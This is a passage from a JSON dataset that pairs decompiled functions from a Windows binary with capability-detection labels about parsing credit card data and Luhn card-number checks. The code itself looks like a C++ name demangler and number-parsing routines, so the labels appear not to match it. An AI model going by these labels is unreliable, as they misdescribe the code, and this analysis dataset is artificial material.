        "decompiled_code": "\nint32_t fcn.14000a7d0(int64_t arg1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    bool bVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    pcVar2 = *(arg1 + 0x18);\n    cVar1 = *pcVar2;\n    if (cVar1 == 'n') {\n        pcVar5 = pcVar2 + 1;\n        *(arg1 + 0x18) = pcVar5;\n        cVar1 = pcVar2[1];\n        if (9 < cVar1 - 0x30U) {\n            return 0;\n        }\n        bVar3 = true;\n    }\n    else {\n        if (9 < cVar1 - 0x30U) {\n            return 0;\n        }\n        bVar3 = false;\n        pcVar5 = pcVar2;\n    }\n    iVar6 = 0;\n    iVar4 = cVar1 + -0x30;\n    do {\n        pcVar5 = pcVar5 + 1;\n        *(arg1 + 0x18) = pcVar5;\n        iVar6 = iVar4 + iVar6 * 10;\n        if (9 < *pcVar5 - 0x30U) {\n            if (bVar3) {\n                iVar6 = -iVar6;\n            }\n            return iVar6;\n        }\n        iVar4 = *pcVar5 - 0x30U;\n    } while (iVar6 <= (0x7fffffffU - iVar4) / 10);\n    return -1;\n}\n",
        "token_count": 357
    },
    "14000c6d": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\nint32_t * fcn.14000c6d0(int64_t arg1)\n\n{\n    ulong *puVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    ulong arg4;\n    char cVar4;\n    int64_t arg1_00;\n    char *pcVar5;\n    char *pcVar6;\n    uint64_t arg3;\n    uint64_t uVar7;\n    \n    pcVar6 = *(arg1 + 0x18);\n    if (*pcVar6 != 'L') {\n        return NULL;\n    }\n    pcVar5 = pcVar6 + 1;\n    *(arg1 + 0x18) = pcVar5;\n    if (pcVar6[1] == '_') {\n        pcVar5 = pcVar6 + 2;\n        piVar3 = NULL;\n        *(arg1 + 0x18) = pcVar5;\n        cVar4 = pcVar6[2];\n        if (cVar4 != 'Z') goto code_r0x00014000c7a9;\n    }\n    else if (pcVar6[1] != 'Z') {\n        piVar3 = fcn.14000b340(arg1);\n        if (piVar3 == NULL) {\n            return NULL;\n        }\n        pcVar5 = *(arg1 + 0x18);\n        pcVar6 = pcVar5;\n        if (*piVar3 == 0x27) {\n            puVar1 = *(piVar3 + 4);\n            if (*(puVar1 + 0x1c) != 0) {\n                *(arg1 + 0x48) = *(arg1 + 0x48) - *(puVar1 + 1);\n            }\n            iVar2 = sub.msvcrt.dll_strcmp(*puVar1, \"decltype(nullptr)\");\n            cVar4 = *pcVar5;\n            if (iVar2 != 0) goto code_r0x00014000c71d;\n            if (cVar4 == 'E') {\n                *(arg1 + 0x18) = pcVar5 + 1;\n                return piVar3;\n            }\n            uVar7 = 0x3d;\n            if (cVar4 == 'n') goto code_r0x00014000c810;\ncode_r0x00014000c757:\n            do {\n                pcVar5 = pcVar5 + 1;\n                if (cVar4 == '\\0') {\n                    return NULL;\n                }\n                *(arg1 + 0x18) = pcVar5;\n                cVar4 = *pcVar5;\n            } while (cVar4 != 'E');\n            arg3 = pcVar5 - pcVar6;\n        }\n        else {\n            cVar4 = *pcVar5;\ncode_r0x00014000c71d:\n            uVar7 = 0x3d;\n            if (cVar4 == 'n') {\ncode_r0x00014000c810:\n                pcVar6 = pcVar5 + 1;\n                uVar7 = 0x3e;\n                *(arg1 + 0x18) = pcVar6;\n                cVar4 = pcVar5[1];\n            }\n            pcVar5 = pcVar6;\n            if (cVar4 != 'E') goto code_r0x00014000c757;\n            arg3 = 0;\n        }\n        arg1_00 = arg1;\n        arg4 = fcn.14000a770(arg1, pcVar6, arg3);\n        piVar3 = fcn.14000a670(arg1_00, uVar7 & 0xffffffff, piVar3, arg4);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n        goto code_r0x00014000c7a9;\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    if ((pcVar5[1] == 'G') || (pcVar5[1] == 'T')) {\n        piVar3 = fcn.14000d6b0(arg1);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n    }\n    else {\n        piVar3 = fcn.14000e120(arg1, 0);\n        pcVar5 = *(arg1 + 0x18);\n        cVar4 = *pcVar5;\n    }\ncode_r0x00014000c7a9:\n    if (cVar4 != 'E') {\n        return NULL;\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    return piVar3;\n}\n",
        "token_count": 1026
    },
    "14000a97": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nulong fcn.14000a970(int64_t arg1)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = *(arg1 + 0x18);\n    if (*pcVar1 == '_') {\n        *(arg1 + 0x18) = pcVar1 + 1;\n        if (pcVar1[1] == '_') {\n            *(arg1 + 0x18) = pcVar1 + 2;\n            iVar2 = fcn.14000a7d0(arg1);\n            if (iVar2 < 0) {\n                return 0;\n            }\n            if (9 < iVar2) {\n                if (**(arg1 + 0x18) != '_') {\n                    return 0;\n                }\n                *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            }\n        }\n        else {\n            iVar2 = fcn.14000a7d0(arg1);\n            if (iVar2 < 0) {\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 243
    },
    "14001d9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint64_t fcn.14001d9f0(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int64_t arg1_00;\n    uint64_t arg1_01;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t in_stack_00000028;\n    \n    iVar2 = (arg3 + 8) / 9;\n    if (arg3 < 10) {\n        arg1_01 = 0;\n    }\n    else {\n        arg1_01 = 0;\n        iVar5 = 1;\n        do {\n            iVar4 = iVar5 * 2;\n            arg1_01 = arg1_01 + 1;\n            iVar3 = iVar5 * -2;\n            iVar5 = iVar4;\n        } while (iVar2 != iVar4 && SBORROW4(iVar2, iVar4) == iVar2 + iVar3 < 0);\n    }\n    arg1_00 = fcn.14001ceb0(arg1_01);\n    *(arg1_00 + 0x18) = arg4;\n    *(arg1_00 + 0x14) = 1;\n    if (arg2 < 10) {\n        pcVar6 = arg1 + 9;\n        arg2._0_4_ = 9;\n    }\n    else {\n        pcVar6 = arg1 + 9;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n            arg1_00 = fcn.14001d010(arg1_00, 10, cVar1 - 0x30);\n        } while (pcVar6 != arg1 + arg2);\n    }\n    pcVar6 = pcVar6 + in_stack_00000028;\n    if (arg2 < arg3) {\n        pcVar7 = pcVar6 + (arg3 - arg2);\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n            arg1_00 = fcn.14001d010(arg1_00, 10, cVar1 - 0x30);\n        } while (pcVar6 != pcVar7);\n    }\n    return arg1_00;\n}\n",
        "token_count": 531
    },
    "140020cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint64_t fcn.140020cd0(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    bool bVar1;\n    uint64_t uVar2;\n    uchar *puVar3;\n    uchar auStack49 [9];\n    \n    puVar3 = auStack49 + 1;\n    do {\n        puVar3 = puVar3 + -1;\n        *puVar3 = *(arg3 % 10 + 0x14010bad0);\n        bVar1 = 9 < arg3;\n        arg3 = arg3 / 10;\n    } while (bVar1);\n    uVar2 = (auStack49 + 1) - puVar3;\n    if (arg2 < uVar2) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        sub.msvcrt.dll_memcpy(arg1, auStack49 + (1 - uVar2), uVar2);\n        uVar2 = uVar2 & 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 226
    },
    "140032c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint64_t ** fcn.140032c50(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int32_t iVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    bool bVar16;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg3[1];\n    piVar2 = arg4[1];\n    piVar10 = *arg4;\n    uVar9 = piVar1 & 0xffffffff;\n    piVar8 = *arg3;\n    piVar7 = fcn.1400b97f0(in_stack_00000048 + 0xd0);\n    bVar15 = piVar2 == -1;\n    iVar11 = 0;\n    uVar12 = 0;\n    while( true ) {\n        uVar6 = uVar9;\n        bVar16 = uVar6 == 0xffffffff;\n        bVar13 = piVar8 != NULL && bVar16;\n        bVar3 = bVar16;\n        if (bVar13) {\n            if (piVar8[2] < piVar8[3]) {\n                bVar3 = false;\n            }\n            else {\n                iVar5 = (**(*piVar8 + 0x48))(piVar8);\n                if (iVar5 == -1) {\n                    piVar8 = NULL;\n                }\n                bVar3 = iVar5 == -1 && bVar13;\n            }\n        }\n        if ((piVar10 == NULL) || (!bVar15)) {\n            bVar3 = bVar3 ^ bVar15;\n        }\n        else if ((piVar10[3] <= piVar10[2]) && (iVar5 = (**(*piVar10 + 0x48))(piVar10),  iVar5 == -1)) {\n            bVar3 = bVar3 ^ 1;\n            piVar10 = NULL;\n        }\n        if ((in_stack_00000040 <= uVar12) || (!bVar3)) break;\n        if ((piVar8 == NULL) || (!bVar16)) {\n            uVar14 = uVar6 & 0xff;\n        }\n        else if (piVar8[2] < piVar8[3]) {\n            uVar6 = *piVar8[2];\n            uVar14 = uVar6;\n        }\n        else {\n            uVar6 = (**(*piVar8 + 0x48))(piVar8);\n            if (uVar6 == 0xffffffff) {\n                uVar14 = 0xff;\n                uVar6 = 0xffffffff;\n                piVar8 = NULL;\n            }\n            else {\n                uVar14 = uVar6 & 0xff;\n            }\n        }\n        cVar4 = *(piVar7 + uVar14 + 0x139);\n        if (cVar4 == '\\0') {\n            cVar4 = uVar6;\n            if (*(*piVar7 + 0x40) != 0x14002baf0) {\n                cVar4 = (**(*piVar7 + 0x40))(piVar7, uVar6, 0x2a);\n            }\n            if (cVar4 == '*') break;\n            *(piVar7 + uVar14 + 0x139) = cVar4;\n        }\n        if (9 < cVar4 - 0x30U) break;\n        iVar11 = (cVar4 - 0x30U) + iVar11 * 10;\n        if (in_stack_00000038 < iVar11) goto code_r0x000140032d9f;\n        if (piVar8[2] < piVar8[3]) {\n            piVar8[2] = piVar8[2] + 1;\n        }\n        else {\n            (**(*piVar8 + 0x50))(piVar8);\n        }\n        uVar12 = uVar12 + 1;\n        uVar9 = 0xffffffff;\n    }\n    if ((uVar12 != 0 && in_stack_00000030 <= iVar11) && (iVar11 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar11;\n        goto code_r0x000140032daa;\n    }\ncode_r0x000140032d9f:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x000140032daa:\n    arg1[1] = piVar1 & 0xffffffff00000000 | uVar9;\n    *arg1 = piVar8;\n    return arg1;\n}\n",
        "token_count": 1163
    },
    "14003890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.140038900(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    int64_t *piVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg4[1];\n    piVar2 = arg3[1];\n    piVar9 = *arg3;\n    piVar10 = *arg4;\n    piVar5 = fcn.1400b9850(in_stack_00000048 + 0xd0);\n    bVar12 = piVar1 == -1;\n    uVar11 = piVar2 & 0xffffffff;\n    uVar7 = 0;\n    iVar8 = 0;\n    while( true ) {\n        bVar13 = uVar11 == -1;\n        bVar14 = piVar9 != NULL;\n        if (bVar14 && bVar13) break;\n        bVar14 = bVar13;\n        if (piVar10 == NULL || !bVar12) goto code_r0x000140038982;\ncode_r0x000140038a50:\n        bVar6 = piVar10 != NULL;\n        if (piVar10[2] < piVar10[3]) {\n            iVar4 = *piVar10[2];\n        }\n        else {\n            iVar4 = (**(*piVar10 + 0x48))(piVar10);\n        }\n        if (iVar4 == -1) {\n            piVar10 = NULL;\n        }\n        bVar6 = iVar4 == -1 && (bVar6 && bVar12);\n        if (in_stack_00000040 <= uVar7) goto code_r0x000140038a80;\ncode_r0x00014003898e:\n        if (bVar14 == bVar6) goto code_r0x000140038a80;\n        if ((piVar9 != NULL) && (bVar13)) {\n            if (piVar9[2] < piVar9[3]) {\n                iVar4 = *piVar9[2];\n            }\n            else {\n                iVar4 = (**(*piVar9 + 0x48))(piVar9);\n            }\n            if (iVar4 == -1) {\n                piVar9 = NULL;\n            }\n        }\n        cVar3 = (**(*piVar5 + 0x60))(piVar5);\n        if (9 < cVar3 - 0x30U) goto code_r0x000140038a80;\n        iVar8 = (cVar3 - 0x30U) + iVar8 * 10;\n        if (in_stack_00000038 < iVar8) goto code_r0x000140038aaa;\n        if (piVar9[2] < piVar9[3]) {\n            piVar9[2] = piVar9[2] + 2;\n        }\n        else {\n            (**(*piVar9 + 0x50))(piVar9);\n        }\n        uVar7 = uVar7 + 1;\n        uVar11 = 0xffffffff;\n    }\n    if (piVar9[2] < piVar9[3]) {\n        iVar4 = *piVar9[2];\n    }\n    else {\n        iVar4 = (**(*piVar9 + 0x48))(piVar9);\n    }\n    if (iVar4 == -1) {\n        piVar9 = NULL;\n    }\n    bVar14 = iVar4 == -1 && (bVar14 && bVar13);\n    if (piVar10 != NULL && bVar12) goto code_r0x000140038a50;\ncode_r0x000140038982:\n    bVar6 = bVar12;\n    if (uVar7 < in_stack_00000040) goto code_r0x00014003898e;\ncode_r0x000140038a80:\n    if ((uVar7 != 0 && in_stack_00000030 <= iVar8) && (iVar8 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar8;\n        goto code_r0x000140038ab5;\n    }\ncode_r0x000140038aaa:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x000140038ab5:\n    *arg1 = piVar9;\n    arg1[1] = piVar2 & 0xffffffffffff0000 | uVar11 & 0xffff;\n    return;\n}\n",
        "token_count": 1129
    },
    "140061c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nint64_t ** fcn.140061c20(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int32_t iVar11;\n    uint64_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    bool bVar16;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg3[1];\n    piVar2 = arg4[1];\n    piVar10 = *arg4;\n    uVar9 = piVar1 & 0xffffffff;\n    piVar8 = *arg3;\n    piVar7 = fcn.1400b97f0(in_stack_00000048 + 0xd0);\n    bVar15 = piVar2 == -1;\n    iVar11 = 0;\n    uVar12 = 0;\n    while( true ) {\n        uVar6 = uVar9;\n        bVar16 = uVar6 == 0xffffffff;\n        bVar13 = piVar8 != NULL && bVar16;\n        bVar3 = bVar16;\n        if (bVar13) {\n            if (piVar8[2] < piVar8[3]) {\n                bVar3 = false;\n            }\n            else {\n                iVar5 = (**(*piVar8 + 0x48))(piVar8);\n                if (iVar5 == -1) {\n                    piVar8 = NULL;\n                }\n                bVar3 = iVar5 == -1 && bVar13;\n            }\n        }\n        if ((piVar10 == NULL) || (!bVar15)) {\n            bVar3 = bVar3 ^ bVar15;\n        }\n        else if ((piVar10[3] <= piVar10[2]) && (iVar5 = (**(*piVar10 + 0x48))(piVar10),  iVar5 == -1)) {\n            bVar3 = bVar3 ^ 1;\n            piVar10 = NULL;\n        }\n        if ((in_stack_00000040 <= uVar12) || (!bVar3)) break;\n        if ((piVar8 == NULL) || (!bVar16)) {\n            uVar14 = uVar6 & 0xff;\n        }\n        else if (piVar8[2] < piVar8[3]) {\n            uVar6 = *piVar8[2];\n            uVar14 = uVar6;\n        }\n        else {\n            uVar6 = (**(*piVar8 + 0x48))(piVar8);\n            if (uVar6 == 0xffffffff) {\n                uVar14 = 0xff;\n                uVar6 = 0xffffffff;\n                piVar8 = NULL;\n            }\n            else {\n                uVar14 = uVar6 & 0xff;\n            }\n        }\n        cVar4 = *(piVar7 + uVar14 + 0x139);\n        if (cVar4 == '\\0') {\n            cVar4 = uVar6;\n            if (*(*piVar7 + 0x40) != 0x14002baf0) {\n                cVar4 = (**(*piVar7 + 0x40))(piVar7, uVar6, 0x2a);\n            }\n            if (cVar4 == '*') break;\n            *(piVar7 + uVar14 + 0x139) = cVar4;\n        }\n        if (9 < cVar4 - 0x30U) break;\n        iVar11 = (cVar4 - 0x30U) + iVar11 * 10;\n        if (in_stack_00000038 < iVar11) goto code_r0x000140061d6f;\n        if (piVar8[2] < piVar8[3]) {\n            piVar8[2] = piVar8[2] + 1;\n        }\n        else {\n            (**(*piVar8 + 0x50))(piVar8);\n        }\n        uVar12 = uVar12 + 1;\n        uVar9 = 0xffffffff;\n    }\n    if ((uVar12 != 0 && in_stack_00000030 <= iVar11) && (iVar11 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar11;\n        goto code_r0x000140061d7a;\n    }\ncode_r0x000140061d6f:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x000140061d7a:\n    arg1[1] = piVar1 & 0xffffffff00000000 | uVar9;\n    *arg1 = piVar8;\n    return arg1;\n}\n",
        "token_count": 1165
    },
    "14006681": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nvoid fcn.140066810(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int16_t iVar4;\n    int64_t *piVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    int64_t *piVar9;\n    int64_t *piVar10;\n    uint64_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    int32_t *in_stack_00000028;\n    int32_t in_stack_00000030;\n    int32_t in_stack_00000038;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    uint32_t *in_stack_00000050;\n    \n    piVar1 = arg4[1];\n    piVar2 = arg3[1];\n    piVar9 = *arg3;\n    piVar10 = *arg4;\n    piVar5 = fcn.1400b9850(in_stack_00000048 + 0xd0);\n    bVar12 = piVar1 == -1;\n    uVar11 = piVar2 & 0xffffffff;\n    uVar7 = 0;\n    iVar8 = 0;\n    while( true ) {\n        bVar13 = uVar11 == -1;\n        bVar14 = piVar9 != NULL;\n        if (bVar14 && bVar13) break;\n        bVar14 = bVar13;\n        if (piVar10 == NULL || !bVar12) goto code_r0x000140066892;\ncode_r0x000140066960:\n        bVar6 = piVar10 != NULL;\n        if (piVar10[2] < piVar10[3]) {\n            iVar4 = *piVar10[2];\n        }\n        else {\n            iVar4 = (**(*piVar10 + 0x48))(piVar10);\n        }\n        if (iVar4 == -1) {\n            piVar10 = NULL;\n        }\n        bVar6 = iVar4 == -1 && (bVar6 && bVar12);\n        if (in_stack_00000040 <= uVar7) goto code_r0x000140066990;\ncode_r0x00014006689e:\n        if (bVar14 == bVar6) goto code_r0x000140066990;\n        if ((piVar9 != NULL) && (bVar13)) {\n            if (piVar9[2] < piVar9[3]) {\n                iVar4 = *piVar9[2];\n            }\n            else {\n                iVar4 = (**(*piVar9 + 0x48))(piVar9);\n            }\n            if (iVar4 == -1) {\n                piVar9 = NULL;\n            }\n        }\n        cVar3 = (**(*piVar5 + 0x60))(piVar5);\n        if (9 < cVar3 - 0x30U) goto code_r0x000140066990;\n        iVar8 = (cVar3 - 0x30U) + iVar8 * 10;\n        if (in_stack_00000038 < iVar8) goto code_r0x0001400669ba;\n        if (piVar9[2] < piVar9[3]) {\n            piVar9[2] = piVar9[2] + 2;\n        }\n        else {\n            (**(*piVar9 + 0x50))(piVar9);\n        }\n        uVar7 = uVar7 + 1;\n        uVar11 = 0xffffffff;\n    }\n    if (piVar9[2] < piVar9[3]) {\n        iVar4 = *piVar9[2];\n    }\n    else {\n        iVar4 = (**(*piVar9 + 0x48))(piVar9);\n    }\n    if (iVar4 == -1) {\n        piVar9 = NULL;\n    }\n    bVar14 = iVar4 == -1 && (bVar14 && bVar13);\n    if (piVar10 != NULL && bVar12) goto code_r0x000140066960;\ncode_r0x000140066892:\n    bVar6 = bVar12;\n    if (uVar7 < in_stack_00000040) goto code_r0x00014006689e;\ncode_r0x000140066990:\n    if ((uVar7 != 0 && in_stack_00000030 <= iVar8) && (iVar8 <= in_stack_00000038)) {\n        *in_stack_00000028 = iVar8;\n        goto code_r0x0001400669c5;\n    }\ncode_r0x0001400669ba:\n    *in_stack_00000050 = *in_stack_00000050 | 4;\ncode_r0x0001400669c5:\n    *arg1 = piVar9;\n    arg1[1] = piVar2 & 0xffffffffffff0000 | uVar11 & 0xffff;\n    return;\n}\n",
        "token_count": 1127
    },
    "14000c95": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000a69e)\n// WARNING: Removing unreachable block (ram,0x00014000a6e0)\n// WARNING: Removing unreachable block (ram,0x00014000a681)\n// WARNING: Removing unreachable block (ram,0x00014000a730)\n// WARNING: Removing unreachable block (ram,0x00014000a743)\n// WARNING: Removing unreachable block (ram,0x00014000a6e8)\n// WARNING: Removing unreachable block (ram,0x00014000a6f7)\n// WARNING: Removing unreachable block (ram,0x00014000a74f)\n// WARNING: Removing unreachable block (ram,0x00014000a6fe)\n// WARNING: Removing unreachable block (ram,0x00014000a754)\n// WARNING: Removing unreachable block (ram,0x00014000a75d)\n// WARNING: Removing unreachable block (ram,0x00014000a6a3)\n// WARNING: Removing unreachable block (ram,0x00014000a6a8)\n// WARNING: Removing unreachable block (ram,0x00014000a6b2)\n// WARNING: Removing unreachable block (ram,0x00014000a705)\n// WARNING: Removing unreachable block (ram,0x00014000a707)\n\nulong fcn.14000c950(int64_t arg1)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iStack32;\n    \n    uVar1 = *(arg1 + 0x40);\n    if (**(arg1 + 0x18) == 'E') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    // WARNING: Could not recover jumptable at 0x00014000a726. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (*(*0x14010c158 + 0x14010c140))();\n        return uVar1;\n    }\n    iStack32 = 0;\n    piVar3 = &iStack32;\n    while( true ) {\n        iVar2 = fcn.14000c8b0(arg1);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.14000a670(arg1, 0x2f, iVar2, 0);\n        *piVar3 = iVar2;\n        if (iVar2 == 0) break;\n        piVar3 = iVar2 + 0x18;\n        if (**(arg1 + 0x18) == 'E') {\n            *(arg1 + 0x40) = uVar1;\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return iStack32;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 644
    },
    "14000ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nint64_t fcn.14000ca00(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    char *pcVar3;\n    char *pcVar4;\n    char cVar5;\n    ulong arg2_00;\n    \n    cVar5 = **(arg1 + 0x18);\n    if (cVar5 == '\\0') {\ncode_r0x00014000ca98:\n        arg3 = 0;\ncode_r0x00014000ca9a:\n        return arg3;\n    }\n    arg3 = 0;\n    pcVar3 = *(arg1 + 0x18);\n    do {\n    // switch table (75 cases) at 0x14010c488\n        switch(cVar5) {\n        case '0':\n        case '1':\n        case '2':\n        case '3':\n        case '4':\n        case '5':\n        case '6':\n        case '7':\n        case '8':\n        case '9':\n        case 'C':\n        case 'L':\n        case 'U':\n        case 'a':\n        case 'b':\n        case 'c':\n        case 'd':\n        case 'e':\n        case 'f':\n        case 'g':\n        case 'h':\n        case 'i':\n        case 'j':\n        case 'k':\n        case 'l':\n        case 'm':\n        case 'n':\n        case 'o':\n        case 'p':\n        case 'q':\n        case 'r':\n        case 's':\n        case 't':\n        case 'u':\n        case 'v':\n        case 'w':\n        case 'x':\n        case 'y':\n        case 'z':\n            iVar2 = fcn.14000c1c0(arg1);\n            if (arg3 != 0) {\n                iVar2 = fcn.14000a670(arg1, 1, arg3, iVar2);\n            }\n            break;\n        default:\n            goto code_r0x00014000ca98;\n        case 'D':\n            if ((pcVar3[1] & 0xdfU) != 0x54) {\n                iVar2 = fcn.14000c1c0(arg1);\n                goto joined_r0x00014000ca4e;\n            }\n            iVar2 = fcn.14000b340(arg1);\n            if (arg3 == 0) break;\ncode_r0x00014000cb03:\n            arg2_00 = 1;\n            goto code_r0x00014000cb08;\n        case 'E':\n            goto code_r0x00014000ca9a;\n        case 'I':\n            if (arg3 == 0) goto code_r0x00014000ca98;\n            *(arg1 + 0x18) = pcVar3 + 1;\n            iVar2 = fcn.14000c950(arg1);\n            arg2_00 = 4;\ncode_r0x00014000cb08:\n            iVar2 = fcn.14000a670(arg1, arg2_00, arg3, iVar2);\n            break;\n        case 'M':\n            if (arg3 != 0) {\n                pcVar4 = pcVar3 + 1;\n                *(arg1 + 0x18) = pcVar4;\n                cVar5 = pcVar3[1];\n                goto code_r0x00014000ca90;\n            }\n            goto code_r0x00014000ca98;\n        case 'S':\n            iVar2 = fcn.14000b0f0(arg1, 1);\n            if (arg3 == 0) {\n                pcVar4 = *(arg1 + 0x18);\n                cVar5 = *pcVar4;\n                arg3 = iVar2;\n            }\n            else {\n                arg3 = fcn.14000a670(arg1, 1, arg3, iVar2);\n                pcVar4 = *(arg1 + 0x18);\n                cVar5 = *pcVar4;\n            }\n            goto code_r0x00014000ca90;\n        case 'T':\n            iVar2 = fcn.14000aeb0(arg1);\njoined_r0x00014000ca4e:\n            if (arg3 != 0) goto code_r0x00014000cb03;\n        }\n        pcVar4 = *(arg1 + 0x18);\n        cVar5 = *pcVar4;\n        arg3 = iVar2;\n        if ((cVar5 != 'E') && ((arg2 & 1) != 0)) {\n            if ((iVar2 == 0) || (iVar1 = *(arg1 + 0x38),  *(arg1 + 0x3c) <= iVar1)) goto code_r0x00014000ca98;\n            *(*(arg1 + 0x30) + iVar1 * 8) = iVar2;\n            *(arg1 + 0x38) = iVar1 + 1;\n            cVar5 = *pcVar4;\n        }\ncode_r0x00014000ca90:\n        pcVar3 = pcVar4;\n        if (cVar5 == '\\0') goto code_r0x00014000ca98;\n    } while( true );\n}\n",
        "token_count": 1144
    },
    "140015a5": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
